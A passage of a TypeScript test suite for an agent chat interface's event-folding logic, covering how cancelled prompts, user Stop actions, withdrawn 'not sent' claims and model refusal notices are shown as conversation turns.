      part: {
        part_id: "steer",
        message_id: "a1",
        type: "text",
        text: "<system-reminder>read-only</system-reminder>",
        synthetic: true,
      },
    });
    expect(cloneTurns(state)[0].parts).toEqual([]);
  });
});

describe("replayVerdict — only the server's word retires a replay", () => {
  it.each([
    ["idle", "idle", "settle"],
    ["working", "working", "keep"],
    ["no word yet", null, "keep"],
  ] as const)("%s → %s", async (_label, word, expected) => {
    const { replayVerdict } = await import("./harnessEventFold");
    expect(replayVerdict(word)).toBe(expected);
  });
});

// A Stop empties the lane behind the turn it ends, and every message taken out
// of it is reported cancelled by the transcript id the reader already holds it
// under (`usr:<client_id>`). The fold's job is to stamp the SERVER's word onto
// the turn already carrying those words — never to invent one, and never to
// add a second telling of the message.
describe("prompt.cancelled", () => {
  const cancelled = (messageId: string, reason?: string): HarnessEvent => ({
    event_type: "prompt.cancelled",
    message_id: messageId,
    client_id: messageId.replace(/^usr:/u, ""),
    ...(reason === undefined ? {} : { reason }),
  });

  const withPrompt = (id = "usr:c1"): ConversationFoldState => {
    const state = createConversationFoldState({ agentHost: "workspace" });
    foldRelayedPrompt(state, { id, text: "Deploy the staging stack", at: "2026-09-21T12:00:00Z" });
    return state;
  };

  it("marks the message the server named, carrying the reason it gave", () => {
    const state = withPrompt();
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    const turns = cloneTurns(state);
    expect(turns[0].author).toBe("user");
    expect(turns[0].status).toBe("cancelled");
    expect(turns[0].cancelledReason).toBe("stopped");
    // The words stay exactly where they were: nothing is added and nothing is
    // rewritten, so the reader's own message is still the one on screen.
    expect(turns).toHaveLength(1);
    expect(turns[0].parts).toEqual([
      { id: "usr:c1-text", kind: "text", text: "Deploy the staging stack" },
    ]);
  });

  it("never invents a reason the box did not give", () => {
    const state = withPrompt();
    foldHarnessEvent(state, cancelled("usr:c1"));
    const [turn] = cloneTurns(state);
    expect(turn.status).toBe("cancelled");
    expect(turn.cancelledReason).toBeUndefined();
  });

  it("carries a reason this build has never heard of through untouched", () => {
    // A box may name a new reason without waiting on a reader that knows it;
    // clamping it here would make that release a coordinated one.
    const state = withPrompt();
    foldHarnessEvent(state, cancelled("usr:c1", "machine_replaced"));
    expect(cloneTurns(state)[0].cancelledReason).toBe("machine_replaced");
  });

  it("ignores a message id no turn on screen answers to", () => {
    const state = withPrompt();
    foldHarnessEvent(state, cancelled("usr:somebody-elses-window", "stopped"));
    const turns = cloneTurns(state);
    expect(turns).toHaveLength(1);
    expect(turns[0].status).toBe("running");
    expect(turns[0].cancelledReason).toBeUndefined();
  });

  it("ignores an event carrying no message id at all", () => {
    const state = withPrompt();
    foldHarnessEvent(state, { event_type: "prompt.cancelled", reason: "stopped" });
    expect(cloneTurns(state)[0].status).toBe("running");
  });

  it("never cancels a turn the agent wrote", () => {
    // The ids live in one space; a cancellation is only ever about a person's
    // message, and stamping one onto the agent's reply would settle the wrong
    // turn as never-sent.
    const state = createConversationFoldState({ agentHost: "workspace" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, cancelled("a1", "stopped"));
    expect(cloneTurns(state)[0].status).not.toBe("cancelled");
  });

  it("is idempotent: the same event replayed leaves the same one turn", () => {
    const state = withPrompt();
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    const once = cloneTurns(state);
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    expect(cloneTurns(state)).toEqual(once);
  });

  it("stops the chat reading as owed an answer, so no line says it is waiting", () => {
    // The composer's "waiting behind the running turn" line and the working
    // display both read this: a message no machine was handed is owed nothing.
    const state = withPrompt();
    expect(conversationAwaitsResponse(cloneTurns(state))).toBe(true);
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    expect(conversationAwaitsResponse(cloneTurns(state))).toBe(false);
  });

  it("leaves a message that was NOT cancelled still owed an answer", () => {
    // The asymmetry that proves the rule reads the turn's own state rather
    // than simply having stopped answering "true" for a person's message.
    const state = withPrompt();
    foldRelayedPrompt(state, { id: "usr:c2", text: "And run the smoke test" });
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    expect(conversationAwaitsResponse(cloneTurns(state))).toBe(true);
  });

  it("does not let a later echo of the same words adopt the dropped turn", () => {
    // The box never ran this message, so an echo carrying the same text is a
    // DIFFERENT send — it gets its own turn rather than reviving the dead one.
    const state = withPrompt();
    foldHarnessEvent(state, cancelled("usr:c1", "stopped"));
    foldHarnessEvent(state, { event_type: "message.created", message_id: "m9", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "m9",
      part: {
        part_id: "m9-text",
        message_id: "m9",
        type: "text",
        text: "Deploy the staging stack",
      },
    });
    const turns = cloneTurns(state);
    expect(turns).toHaveLength(2);
    expect(turns[0].status).toBe("cancelled");
    expect(turns[1].status).not.toBe("cancelled");
  });
});

describe("a terminal status with no sentence on it", () => {
  /** A turn with a tool still running under it — what a reader is looking at
   *  when they press Stop on a box that is mid-command. */
  const midCommand = (): ConversationFoldState => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      message_id: "a1",
      tool_call_id: "tool-1",
      tool_name: "bash",
      status: "running",
      input: { command: "pytest" },
    });
    return state;
  };

  /** Exactly what the box stamps when a reader's Stop ends the turn: the
   *  sentence for it is the server's "Stopped by <who>." row, so this carries
   *  no detail of its own. */
  const STOPPED: HarnessEvent = {
    event_type: "session.status_changed",
    status: "aborted",
    phase: "idle",
    time: "2026-09-21T17:00:00.000Z",
  };

  it("ends the turn it names, sentence or no sentence", () => {
    const state = midCommand();

    foldHarnessEvent(state, STOPPED);

    const turns = cloneTurns(state);
    expect(conversationAwaitsResponse(turns)).toBe(false);
    expect(turns[0].status).toBe("cancelled");
    const tool = turns[0].parts.find((part) => part.kind === "tool") as ToolConversationPart;
    expect(tool.state).not.toBe("running");
    expect(turns).toHaveLength(1);
  });

  it("still shows the sentence when the abort carries one", () => {
    const state = midCommand();

    foldHarnessEvent(state, { ...STOPPED, detail: "The turn ran out of its time budget." });

    const turns = cloneTurns(state);
    expect(conversationAwaitsResponse(turns)).toBe(false);
    expect(turns[0].status).toBe("cancelled");
    expect(turns).toHaveLength(2);
    expect(turns[1].author).toBe("system");
    expect(turns[1].parts.map((part) => (part.kind === "system" ? part.text : ""))).toContain(
      "The turn ran out of its time budget.",
    );
  });
});

describe("a message reported not sent that the box had in fact taken", () => {
  const sent = (): ConversationFoldState => {
    const state = createConversationFoldState();
    foldRelayedPrompt(state, {
      id: "usr:c1",
      text: "Deploy the staging stack",
      at: "2026-09-21T17:00:00.000Z",
    });
    return state;
  };

  it("stops claiming it was not sent once the box starts answering it", () => {
    // The server records the stop in the moment before its relay reaches the
    // box, so it sees nothing published yet and writes "never run" — and the
    // box, which already had the message, publishes its turn a beat later.
    // One log, two claims: the later one is the true one.
    const state = sent();
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:c1",
      reason: "stopped",
    });
    expect(cloneTurns(state)[0].status).toBe("cancelled");

    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });

    const turns = cloneTurns(state);
    expect(turns[0].status).not.toBe("cancelled");
    expect(turns[0].cancelledReason).toBeUndefined();
  });

  /** The line the server writes when it records a stop: a system message of
   *  its own, three rows, naming who pressed it. It lands in the SAME
   *  transaction as the cancellation and above it, so in production it always
   *  sits between the claim and the box's first row. */
  const stoppedByNote = (state: ConversationFoldState): void => {
    foldHarnessEvent(state, {
      event_type: "message.created",
      message_id: "stop-1",
      role: "system",
    });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "stop-1",
      part: {
        part_id: "stop-1-part",
        message_id: "stop-1",
        type: "text",
        text: "Stopped by Admin.",
        synthetic: true,
      },
    });
    foldHarnessEvent(state, {
      event_type: "message.completed",
      message_id: "stop-1",
      finish_reason: "stop",
    });
  };

  it("stops claiming it, with the stop's own line standing between them", () => {
    // The order the server actually writes: the cancellation and the "Stopped
    // by" note are one transaction, so the note is always in between. A
    // withdrawal that looked only at the last turn saw the note and did
    // nothing — the bubble kept saying "Not sent" under an answer.
    const state = sent();
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:c1",
      reason: "stopped",
    });
    stoppedByNote(state);

    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });

    const turns = cloneTurns(state);
    expect(turns[0].status).not.toBe("cancelled");
    expect(turns[0].cancelledReason).toBeUndefined();
    expect(turns.map((turn) => turn.author)).toEqual(["user", "system", "assistant"]);
  });

  it("withdraws nothing when the note is all that follows", () => {
    // A note is not work. The message really was never run, and the line the
    // server wrote about the stop must not be read as the box answering it.
    const state = sent();
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:c1",
      reason: "stopped",
    });

    stoppedByNote(state);

    expect(cloneTurns(state)[0].status).toBe("cancelled");
  });

  it("stops claiming it when the only row about the turn is its end", () => {
    // The box was stopped before it had published a word of the turn — two of
    // the four attempts in the live check. Nothing answers the message, so
    // nothing opens an assistant turn; the ONLY row saying a turn existed is
    // the terminal that ends it. The reader is still owed the truth: it was
    // sent, and the stop ended it.
    const state = sent();
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:c1",
      reason: "stopped",
    });
    stoppedByNote(state);

    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "aborted",
      phase: "idle",
      time: "2026-09-21T17:00:01.000Z",
    });

    const turns = cloneTurns(state);
    expect(turns[0].status).not.toBe("cancelled");
    expect(turns[0].cancelledReason).toBeUndefined();
    expect(turns.map((turn) => turn.author)).toEqual(["user", "system"]);
  });

  it("keeps the claim of a message queued behind a turn that was already running", () => {
    // The false positive. A turn is RUNNING and a second message is queued
    // behind it; the Stop cancels the queued one (it never left the lane) and
    // ends the running one. The terminal that follows belongs to the turn it
    // ended — not to the message that never started — so the queued message
    // keeps its line. Withdrawing there told the reader a message was sent
    // that the box had never been handed.
    const state = createConversationFoldState();
    foldRelayedPrompt(state, {
      id: "usr:a",
      text: "Count the mentions",
      at: "2026-09-21T17:00:00.000Z",
    });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "m-a", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "m-a",
      part: { part_id: "m-a-text", message_id: "m-a", type: "text", text: "Working on it" },
    });
    foldRelayedPrompt(state, { id: "usr:b", text: "And by region", at: "2026-09-21T17:00:05.000Z" });
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:b",
      reason: "stopped",
    });
    stoppedByNote(state);

    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "aborted",
      phase: "idle",
      time: "2026-09-21T17:00:06.000Z",
    });

    const turns = cloneTurns(state);
    const queued = turns.find((turn) => turn.id === "usr:b");
    expect(queued?.status).toBe("cancelled");
    expect(queued?.cancelledReason).toBe("stopped");
    const answering = turns.find((turn) => turn.id === "m-a");
    expect(answering?.status, "and the turn it really ended is ended").toBe("cancelled");
  });

  it("keeps the claim when nothing says a turn ever existed", () => {
    // The fourth attempt: the message never left the lane. No terminal, no
    // work — the line stands, and a reader is told their message was not sent
    // because it was not.
    const state = sent();
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:c1",
      reason: "stopped",
    });
    stoppedByNote(state);

    expect(cloneTurns(state)[0].status).toBe("cancelled");
    expect(cloneTurns(state)[0].cancelledReason).toBe("stopped");
  });

  it("leaves an earlier dropped message alone when a later one is answered", () => {
    // The asymmetry: work that starts after a NEWER message is that message's,
    // and the one dropped before it stays dropped.
    const state = sent();
    foldHarnessEvent(state, {
      event_type: "prompt.cancelled",
      message_id: "usr:c1",
      reason: "stopped",
    });
    foldRelayedPrompt(state, {
      id: "usr:c2",
      text: "Try again",
      at: "2026-09-21T17:01:00.000Z",
    });

    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });

    const turns = cloneTurns(state);
    expect(turns[0].status).toBe("cancelled");
    expect(turns[1].status).not.toBe("cancelled");
  });
});

describe("a turn the model ended with no answer", () => {
  // The session writes one sentence on the model's own message just before
  // that message's `content-filter` completion (`harness/empty_answer.py`).
  // The reader sees it as the reply: not suppressed as tooling, not an empty
  // assistant turn.
  it("shows the sentence the session wrote as the assistant's reply", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u1",
      part: { part_id: "u1-p", message_id: "u1", type: "text", text: "tell me" },
    });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      part: {
        part_id: "a1-empty-answer",
        message_id: "a1",
        type: "text",
        text: "The model declined to answer this message.",
        metadata: { alkera_notice: "empty_answer" },
      },
    });
    foldHarnessEvent(state, {
      event_type: "message.completed",
      message_id: "a1",
      finish_reason: "content-filter",
    });
    const turns = cloneTurns(state);
    const reply = turns.find((turn) => turn.author === "assistant");
    expect(reply).toBeDefined();
    const texts = reply!.parts.filter((part) => part.kind === "text").map((part) => (part as { text: string }).text);
    expect(texts).toEqual(["The model declined to answer this message."]);
  });
});
